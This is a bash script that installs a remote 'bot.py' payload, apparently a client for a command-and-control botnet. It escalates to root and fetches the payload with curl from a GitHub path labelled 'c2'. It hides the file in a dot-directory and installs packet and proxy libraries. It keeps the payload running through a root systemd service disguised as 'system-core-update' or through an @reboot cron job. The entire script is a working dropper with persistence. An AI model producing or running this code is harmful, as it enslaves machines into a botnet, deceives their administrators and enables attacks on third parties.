PYTHON_PACKAGES="cloudscraper requests pysocks scapy icmplib"
PAYLOAD_URL="https://raw.githubusercontent.com/0bxb2/c23/refs/heads/main/c2/src/Payload/bot.py"

PAYLOAD_DIR="/usr/local/share/.payload"
PAYLOAD_PATH="${PAYLOAD_DIR}/bot.py"
SERVICE_NAME="system-core-update" 


print_message() {
    COLOR=$1
    MESSAGE=$2
    NC='\033[0m' 
    case $COLOR in
        "green") C='\033[0;32m';;
        "red") C='\033[0;31m';;
        "yellow") C='\033[1;33m';;
        "blue") C='\033[0;34m';;
        *) C='\033[0m';;
    esac
    echo -e "${C}${MESSAGE}${NC}"
}


if [ "$EUID" -ne 0 ]; then
  echo -e "\e[31m[!] This script is not running as root. Attempting to elevate privileges...\e[0m"
  
  if command -v sudo >/dev/null 2>&1; then
    sudo "$0" "$@"
    exit $?
  else
    echo -e "\e[33m[!] 'sudo' is not available. Continuing without root. Some actions may fail.\e[0m"
  fi
fi

print_message "blue" "[*] Detecting package manager..."
INSTALL_CMD=""
UPDATE_CMD=""

if ! command -v crontab &> /dev/null; then
  echo -e "\e[33m[!] 'crontab' not found. Attempting to install it...\e[0m"
  
  if command -v apt-get &> /dev/null; then
    apt-get update && apt-get install -y cron
  elif command -v dnf &> /dev/null; then
    dnf install -y cronie
  elif command -v yum &> /dev/null; then
    yum install -y cronie
  elif command -v pacman &> /dev/null; then
    pacman -S --noconfirm cronie
  elif command -v zypper &> /dev/null; then
    zypper install -y cron
  elif command -v apk &> /dev/null; then
    apk add --no-cache dcron
  else
    echo -e "\e[31m[!] Could not install 'cron'. Unsupported package manager.\e[0m"
    exit 1
  fi
fi


if command -v apt-get &> /dev/null; then
  UPDATE_CMD="apt-get update"
  INSTALL_CMD="apt-get install -y python3 python3-pip curl"
elif command -v dnf &> /dev/null; then
  INSTALL_CMD="dnf install -y python3 python3-pip curl"
elif command -v yum &> /dev/null; then
  INSTALL_CMD="yum install -y python3 python3-pip curl"
elif command -v pacman &> /dev/null; then
  INSTALL_CMD="pacman -S --noconfirm python python-pip curl"
elif command -v zypper &> /dev/null; then
  INSTALL_CMD="zypper install -y python3 python3-pip curl"
elif command -v apk &> /dev/null; then
  INSTALL_CMD="apk add --no-cache python3 py3-pip curl"
elif command -v apk &> /dev/null; then
  print_message "red" "[!] Could not detect a supported package manager. Aborting."
  exit 1
fi


print_message "blue" "[*] Installing system dependencies (Python3, Pip, Curl)..."
if [ -n "$UPDATE_CMD" ]; then
    $UPDATE_CMD &> /dev/null
fi
$INSTALL_CMD &> /dev/null


PYTHON_EXEC=$(command -v python3)
if [ -z "$PYTHON_EXEC" ]; then
    print_message "red" "[!] Python3 installation failed or not found in PATH. Aborting."
    exit 1
fi
print_message "green" "[+] System dependencies installed."


print_message "blue" "[*] Creating payload directory: $PAYLOAD_DIR"
mkdir -p "$PAYLOAD_DIR"
print_message "blue" "[*] Downloading payload from $PAYLOAD_URL..."
if curl -sS -L "$PAYLOAD_URL" -o "$PAYLOAD_PATH"; then
    print_message "green" "[+] Payload downloaded successfully to $PAYLOAD_PATH"
else
    print_message "red" "[!] Failed to download payload. Check URL and network connection."
    exit 1
fi
chmod +x "$PAYLOAD_PATH"


print_message "blue" "[*] Installing Python packages: $PYTHON_PACKAGES"
if $PYTHON_EXEC -m pip install $PYTHON_PACKAGES &> /dev/null; then
    print_message "green" "[+] Python packages installed."
else
    print_message "red" "[!] Failed to install Python packages."
    
fi


print_message "blue" "[*] Setting up persistence..."


if command -v systemctl &> /dev/null && [ -d /run/systemd/system ]; then
    print_message "blue" "[*] Systemd detected. Creating a service for persistence."
    SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

    cat > "$SERVICE_FILE" << EOF
[Unit]
Description=System Core Update Service
After=network.target

[Service]
ExecStart=$PYTHON_EXEC $PAYLOAD_PATH
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "${SERVICE_NAME}" &> /dev/null
    systemctl start "${SERVICE_NAME}"
    print_message "green" "[+] Systemd service '${SERVICE_NAME}' created and enabled."
    print_message "green" "[+] Payload is now running and will start on boot."


else
    print_message "yellow" "[*] Systemd not found. Falling back to Cron for persistence."
    
    (crontab -l 2>/dev/null; echo "@reboot $PYTHON_EXEC $PAYLOAD_PATH") | crontab -
    print_message "green" "[+] Root cron job created. Payload will start on boot."
    
    
    print_message "blue" "[*] Starting payload for the first time..."
    nohup $PYTHON_EXEC "$PAYLOAD_PATH" >/dev/null 2>&1 &
    print_message "green" "[+] Payload is now running in the background."
fi

print_message "green" "===================== INSTALLATION COMPLETE ====================="
print_message "yellow" "The payload is running and configured to start automatically on reboot."
